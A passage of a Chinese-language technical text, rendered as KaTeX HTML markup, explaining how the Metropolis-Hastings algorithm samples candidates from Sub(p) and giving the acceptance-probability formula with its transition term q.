style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 。为了抽取这样的样本，我们使用 *Metropolis-Hastings（MH）*算法[7]，给定当前样本 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">p&#x27;_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0106em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span></eq> ，定义新样本<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">p&#x27;_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0689em;vertical-align:-0.317em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span></span></span></span></eq>被接受的概率为：<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>A</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>→</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mfrac><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo><mo>∗</mo><mi>q</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo></mrow><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo><mo>∗</mo><mi>q</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo></mrow></mfrac><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mfrac><mrow><mi>e</mi><mi>x</mi><mi>p</mi><mo stretchy="false">(</mo><mi>k</mi><mo>∗</mo><mi>O</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>∗</mo><mi>q</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo></mrow><mrow><mi>e</mi><mi>x</mi><mi>p</mi><mo stretchy="false">(</mo><mi>k</mi><mo>∗</mo><mi>O</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>∗</mo><mi>q</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo></mrow></mfrac><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex"> \begin{aligned} A(p&#x27;_i \rightarrow p&#x27;_{i+1}) &amp;= min(1,\frac{f(p,p&#x27;_{i+1}) * q(p&#x27;_i,p&#x27;_{i+1})}{f(p,p&#x27;_i)*q(p&#x27;_{i+1},p&#x27;_i)}) \\ &amp;=min(1,\frac{exp(k*O(p,p&#x27;_{i+1})) *q(p&#x27;_i,p&#x27;_{i+1})}{exp(k*O(p,p&#x27;_i)) *q(p&#x27;_{i+1},p&#x27;_i)}) \end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.5602em;vertical-align:-2.5301em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.0301em;"><span style="top:-5.0301em;"><span class="pstrut" style="height:3.4589em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3053em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.4589em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.5301em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.0301em;"><span style="top:-5.0301em;"><span class="pstrut" style="height:3.4589em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">min</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4589em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7337em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7337em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3352em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7337em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.707em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0212em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.4589em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">min</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4589em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7337em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7337em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3352em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7337em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.707em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0212em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.5301em;"><span></span></span></span></span></span></span></span></span></span></span></span></eqn></section> 其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">q(p&#x27;_i,p&#x27;_{i+1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0689em;vertical-align:-0.317em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> 是从 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">p&#x27;_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0106em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span></eq> 到 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">p&#x27;_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0689em;vertical-align:-0.317em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span></span></span></span></eq> 的转移概率. 当转移是对称时(例如 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo><mo>=</mo><mi>q</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">q(p&#x27;_i,p&#x27;_{i+1})=q(p&#x27;_{i+1},p&#x27;_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0689em;vertical-align:-0.317em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord 